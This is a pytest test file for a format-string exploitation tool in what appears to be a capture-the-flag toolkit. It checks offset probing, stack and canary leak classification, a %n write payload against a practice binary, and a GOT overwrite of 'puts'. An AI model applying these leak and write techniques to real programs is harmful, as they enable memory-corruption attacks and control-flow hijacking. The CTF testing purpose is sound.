"""fmtool finds the input offset, classifies the stack, and its write lands."""

from __future__ import annotations

from ctftools.core.binary import load_binary
from ctftools.core.runner import run_target
from ctftools.tools import fmtool

TARGET_SYMBOL = "target"


def test_input_offset_is_found(target):
    info = load_binary(target("fmt_string"))
    found = fmtool.probe_offset(target("fmt_string"), word=info.word)
    assert found["confirmed"] is True
    assert found["offset"] == 6


def test_stack_dump_sees_our_own_bytes(target):
    slots = fmtool.dump_stack(target("fmt_string"), count=10)
    assert len(slots) == 10
    assert any(s["value"] for s in slots)


def test_classifier_separates_stack_from_libc(target):
    info = load_binary(target("fmt_string"))
    assert fmtool.classify(0x7FFC8C9B7CB0, info) == "stack pointer"
    assert fmtool.classify(0x7F78E6D1BD31, info) == "libc pointer"
    assert fmtool.classify(0xA1B2C3D4E5F6_00 & 0xFFFFFFFFFFFFFF00, info) == "canary"
    assert fmtool.classify(0, info) == "null"
    assert fmtool.classify(None, info) == "-"


def test_report_finds_something_worth_leaking(target):
    report = fmtool.analyse(target("fmt_string"), count=16)
    interesting = report.data["interesting"]
    assert interesting["libc pointer"] is not None
    assert interesting["stack pointer"] is not None


def test_write_payload_actually_writes(target):
    """Build a %n payload for the global and check the program sees the value."""
    info = load_binary(target("fmt_string"))
    address = info.symbol(TARGET_SYMBOL)
    assert address, "the test binary should export `target`"

    payload = fmtool.write_payload(6, {address: 0xDEADBEEF}, info.word)
    # The binary reads twice, so a second line lets it reach the check.
    result = run_target(target("fmt_string"), payload + b"\n\n", timeout=10.0)

    assert b"target=0xdeadbeef" in result.stdout, result.stdout[-200:]
    assert b"flag{format_write}" in result.stdout


def test_got_overwrite_payload_is_built(target):
    info = load_binary(target("fmt_string"))
    got = info.elf.got["puts"]
    report = fmtool.analyse(target("fmt_string"), count=8, writes={int(got): 0x401196})
    assert report.data["write_payload_hex"]
    assert hex(int(got)) in report.data["writes"]
